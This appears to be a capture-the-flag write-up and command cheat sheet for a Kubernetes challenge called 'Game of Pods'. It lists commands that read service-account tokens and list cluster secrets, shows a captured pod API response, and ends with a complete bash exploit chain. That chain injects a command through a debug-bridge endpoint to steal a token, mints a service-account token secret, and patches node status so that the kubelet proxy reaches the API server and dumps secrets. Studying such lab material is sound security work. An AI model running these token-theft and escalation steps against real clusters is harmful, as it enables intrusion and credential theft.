

### Game of Pods
```bash
You've gained access to a pod in the staging environment.

To beat this challenge, you'll have to spread throughout the cluster and escalate privileges. Can you reach the flag?

Good luck! 
```

## 🛠️ Useful Kubernetes Commands for CTFs (Game of Pods Challenge)

## 📁 Pod Environment & Filesystem Discovery

`cat /etc/os-release`
### Shows OS version and distro — helps confirm if the base image is Alpine, Ubuntu, etc.

`id && whoami`
### Confirms your current user and privilege level. Being root opens up more exploitation options.

`env`
### Displays environment variables — useful for spotting secrets, tokens, or internal URLs.

`cat /proc/1/environ | tr '\0' '\n'`
### Shows environment variables from PID 1 — includes init-only variables not shown by env.

`find / -type f -name "*flag*" 2>/dev/null`
### Recursively searches for files with "flag" in the name — common method to locate CTF flags.

`grep -r "WIZ_CTF{" / 2>/dev/null`
### Searches all files for the flag pattern. Ignores permission errors.

### 🔐 Kubernetes API Access From Inside a Pod

`cat /var/run/secrets/kubernetes.io/serviceaccount/token`
### Reads the service account token — used to authenticate with the Kubernetes API server.

`cat /var/run/secrets/kubernetes.io/serviceaccount/namespace`
### Shows the namespace the pod is running in.

`curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc`
### Tests basic Kubernetes API access with the token.

### 🧠 Kubernetes API Enumeration via curl
```bash
curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/pods | jq`

# Lists all pods in the current namespace (e.g. staging). Useful for discovering container images, names, etc.

curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/secrets | jq
# Lists secrets in the current namespace (if RBAC allows). Often contains service credentials.

curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/configmaps | jq
# Lists ConfigMaps in the current namespace. These may include sensitive settings.

curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/serviceaccounts | jq
# Lists ServiceAccounts in the namespace. Helpful to find more privileged accounts.
```
### 🔍 Image & Registry Enumeration

`docker pull hustlehub.azurecr.io/test:latest`
### Attempts to pull the container image from a private Azure Container Registry (ACR).
### May work if the image or registry allows anonymous access.

`ctr image pull hustlehub.azurecr.io/test:latest`
### Alternative pull command if containerd is used instead of Docker.

`docker inspect hustlehub.azurecr.io/test:latest`
### Shows image metadata, history, labels, and env vars. Useful to inspect for embedded flags or secrets.

### 📦 Azure ACR Registry Access

`az acr repository list --name hustlehub --output table`
### Tries to list public images in the ACR. Requires az CLI and public access.

`docker login hustlehub.azurecr.io`
### Login to ACR manually — use if you obtain credentials from secrets or config.

```bash

curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "842"
  },
  "items": [
    {
      "metadata": {
        "name": "test",
        "namespace": "staging",
        "uid": "4f0c0d93-f622-47ad-b040-3f784afcc7ac",
        "resourceVersion": "407",
        "creationTimestamp": "2025-10-26T19:59:00Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"test\",\"namespace\":\"staging\"},\"spec\":{\"containers\":[{\"image\":\"hustlehub.azurecr.io/test:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"test\"}],\"serviceAccountName\":\"test-sa\"}}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:59:00Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"test\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:resources": {},
                    "f:terminationMessagePath": {},
                    "f:terminationMessagePolicy": {}
                  }
                },
                "f:dnsPolicy": {},
                "f:enableServiceLinks": {},
                "f:restartPolicy": {},
                "f:schedulerName": {},
                "f:securityContext": {},
                "f:serviceAccount": {},
                "f:serviceAccountName": {},
                "f:terminationGracePeriodSeconds": {}
              }
            }
          },
          {
            "manager": "k3s",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-10-26T19:59:19Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:status": {
                "f:conditions": {
                  "k:{\"type\":\"ContainersReady\"}": {
                    ".": {},
                    "f:lastProbeTime": {},
                    "f:lastTransitionTime": {},
                    "f:status": {},
                    "f:type": {}
                  },
                  "k:{\"type\":\"Initialized\"}": {
                    ".": {},
                    "f:lastProbeTime": {},
                    "f:lastTransitionTime": {},
                    "f:status": {},
                    "f:type": {}
                  },
                  "k:{\"type\":\"PodReadyToStartContainers\"}": {
                    ".": {},
                    "f:lastProbeTime": {},
                    "f:lastTransitionTime": {},
                    "f:status": {},
                    "f:type": {}
                  },
                  "k:{\"type\":\"Ready\"}": {
                    ".": {},
                    "f:lastProbeTime": {},
                    "f:lastTransitionTime": {},
                    "f:status": {},
                    "f:type": {}
                  }
                },
                "f:containerStatuses": {},
                "f:hostIP": {},
                "f:hostIPs": {},
                "f:phase": {},
                "f:podIP": {},
                "f:podIPs": {
                  ".": {},
                  "k:{\"ip\":\"10.42.0.2\"}": {
                    ".": {},
                    "f:ip": {}
                  }
                },
                "f:startTime": {}
              }
            },
            "subresource": "status"
          }
        ]
      },
      "spec": {
        "volumes": [
          {
            "name": "kube-api-access-9r88v",
            "projected": {
              "sources": [
                {
                  "serviceAccountToken": {
                    "expirationSeconds": 3607,
                    "path": "token"
                  }
                },
                {
                  "configMap": {
                    "name": "kube-root-ca.crt",
                    "items": [
                      {
                        "key": "ca.crt",
                        "path": "ca.crt"
                      }
                    ]
                  }
                },
                {
                  "downwardAPI": {
                    "items": [
                      {
                        "path": "namespace",
                        "fieldRef": {
                          "apiVersion": "v1",
                          "fieldPath": "metadata.namespace"
                        }
                      }
                    ]
                  }
                }
              ],
              "defaultMode": 420
            }
          }
        ],
        "containers": [
          {
            "name": "test",
            "image": "hustlehub.azurecr.io/test:latest",
            "resources": {},
            "volumeMounts": [
              {
                "name": "kube-api-access-9r88v",
                "readOnly": true,
                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
              }
            ],
            "terminationMessagePath": "/dev/termination-log",
            "terminationMessagePolicy": "File",
            "imagePullPolicy": "IfNotPresent"
          }
        ],
        "restartPolicy": "Always",
        "terminationGracePeriodSeconds": 30,
        "dnsPolicy": "ClusterFirst",
        "serviceAccountName": "test-sa",
        "serviceAccount": "test-sa",
        "nodeName": "noder",
        "securityContext": {},
        "schedulerName": "default-scheduler",
        "tolerations": [
          {
            "key": "node.kubernetes.io/not-ready",
            "operator": "Exists",
            "effect": "NoExecute",
            "tolerationSeconds": 300
          },
          {
            "key": "node.kubernetes.io/unreachable",
            "operator": "Exists",
            "effect": "NoExecute",
            "tolerationSeconds": 300
          }
        ],
        "priority": 0,
        "enableServiceLinks": true,
        "preemptionPolicy": "PreemptLowerPriority"
      },
      "status": {
        "phase": "Running",
        "conditions": [
          {
            "type": "PodReadyToStartContainers",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2025-10-26T19:59:19Z"
          },
          {
            "type": "Initialized",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2025-10-26T19:59:00Z"
          },
          {
            "type": "Ready",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2025-10-26T19:59:19Z"
          },
          {
            "type": "ContainersReady",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2025-10-26T19:59:19Z"
          },
          {
            "type": "PodScheduled",
            "status": "True",
            "lastProbeTime": null,
            "lastTransitionTime": "2025-10-26T19:59:00Z"
          }
        ],
        "hostIP": "172.30.0.2",
        "hostIPs": [
          {
            "ip": "172.30.0.2"
          }
        ],
        "podIP": "10.42.0.2",
        "podIPs": [
          {
            "ip": "10.42.0.2"
          }
        ],
        "startTime": "2025-10-26T19:59:00Z",
        "containerStatuses": [
          {
            "name": "test",
            "state": {
              "running": {
                "startedAt": "2025-10-26T19:59:19Z"
              }
            },
            "lastState": {},
            "ready": true,
            "restartCount": 0,
            "image": "hustlehub.azurecr.io/test:latest",
            "imageID": "hustlehub.azurecr.io/test@sha256:6c49ed1562fc0394f3e50549895776c5cac96524b011b8c4a26dea211e9d4610",
            "containerID": "containerd://e4602154b08dd6b551d516d835212f57404d78eed27f81f13290f804fb19f4a3",
            "started": true,
            "volumeMounts": [
              {
                "name": "kube-api-access-9r88v",
                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount",
                "readOnly": true,
                "recursiveReadOnly": "Disabled"
              }
            ]
          }
        ],
        "qosClass": "BestEffort"
      }
    }
  ]

  ```



### Key Details Extracted from the API Response

| **Field**             | **Value / Insight**                                                             |
| --------------------- | ------------------------------------------------------------------------------- |
| **Pod Name**          | `test`                                                                          |
| **Namespace**         | `staging`                                                                       |
| **ServiceAccount**    | `test-sa` (your pod runs with this SA)                                          |
| **Image**             | `hustlehub.azurecr.io/test:latest` ← **Private Azure Container Registry (ACR)** |
| **Pod IP**            | `10.42.0.2`                                                                     |
| **Node Name**         | `noder`                                                                         |
| **Volume Mounted**    | `kube-api-access-9r88v` ← includes token, CA cert, namespace info               |
| **Privileges**        | Running as `root` inside the container                                          |
| **Status**            | Pod is `Running`, container is `Ready`, no restarts                             |
| **Image SHA**         | `sha256:6c49ed15...`                                                            |
| **Container Runtime** | `containerd` (based on `containerd://` in `containerID`)                        |


So it’s very likely that:

The flag is inside a different image stored in `hustlehub.azurecr.io.`

Enumerate All Pods in Your Namespace

```bash
curl -sSk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/namespaces/staging/pods | jq '.items[].spec.containers[].image'

```

```bash
#!/bin/bash
# Complete Wiz CTF Exploitation: exploit.sh + NCC-E003660-JAV

set -e

echo "=========================================="
echo "Wiz CTF - Complete Exploitation Chain"
echo "=========================================="

# Phase 1: Initial setup
export IP_ADDRESS='172.30.0.2'
export NAMESPACE='app'
export POD_NAME='app-blog'
export CONTAINER_NAME='app-blog'
export KUBE_API="https://172.30.0.2:6443"

echo "[+] Phase 1: Extract app-blog token"
TOKEN_APP=$(curl -s -XPOST http://k8s-debug-bridge.app/checkpoint \
  -d "{\"node_ip\": \"${IP_ADDRESS}:10250/run/${NAMESPACE}/${POD_NAME}/${CONTAINER_NAME}?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token#\",
       \"pod\": \"${POD_NAME}\", \"namespace\": \"${NAMESPACE}\", \"container\": \"${CONTAINER_NAME}\"}")

echo "[+] Phase 2: Create secret for k8s-debug-bridge token"
cat > /tmp/secret.yml <<'EOF'
apiVersion: v1
kind: Secret
metadata:
  name: debug-bridge-token
  namespace: app
  annotations:
    kubernetes.io/service-account.name: "k8s-debug-bridge"
type: kubernetes.io/service-account-token
EOF

kubectl --server="${KUBE_API}" --insecure-skip-tls-verify=true \
  --token="${TOKEN_APP}" -n app apply -f /tmp/secret.yml 2>/dev/null || true

sleep 5

echo "[+] Phase 3: Extract k8s-debug-bridge token"
TOKEN2_B64=$(kubectl --server="${KUBE_API}" --insecure-skip-tls-verify=true \
  --token="${TOKEN_APP}" -n app get secret debug-bridge-token -o jsonpath='{.data.token}')
export TOKEN2=$(echo "$TOKEN2_B64" | base64 -d | tr -d '\n\r ')

echo "[+] Phase 4: Get node info"
NODE=$(kubectl --server="${KUBE_API}" --insecure-skip-tls-verify \
  --token="$TOKEN2" get nodes -o jsonpath='{.items[0].metadata.name}')
echo "    Node: $NODE"

echo "[+] Phase 5: NCC-E003660-JAV - Patch node status"
curl -sk -H "Authorization: Bearer ${TOKEN2}" \
  -H 'Content-Type: application/json' \
  "${KUBE_API}/api/v1/nodes/${NODE}/status" > /tmp/node-orig.json

sed 's/"Port": 10250/"Port": 6443/g' /tmp/node-orig.json > /tmp/node-patched.json

curl -sk -H "Authorization: Bearer ${TOKEN2}" \
  -H 'Content-Type: application/merge-patch+json' \
  -X PATCH -d "@/tmp/node-patched.json" \
  "${KUBE_API}/api/v1/nodes/${NODE}/status" > /dev/null

echo "[+] Phase 6: EXPLOIT - Get flag as cluster-admin!"
echo ""

curl -sk -H "Authorization: Bearer ${TOKEN2}" \
  "${KUBE_API}/api/v1/nodes/https:${NODE}:6443/proxy/api/v1/secrets/" \
  | jq -r '.items[] | select(.data.flag) | .data.flag' | base64 -d

echo ""
echo "[+] DONE! Flag retrieved via NCC-E003660-JAV privilege escalation"
```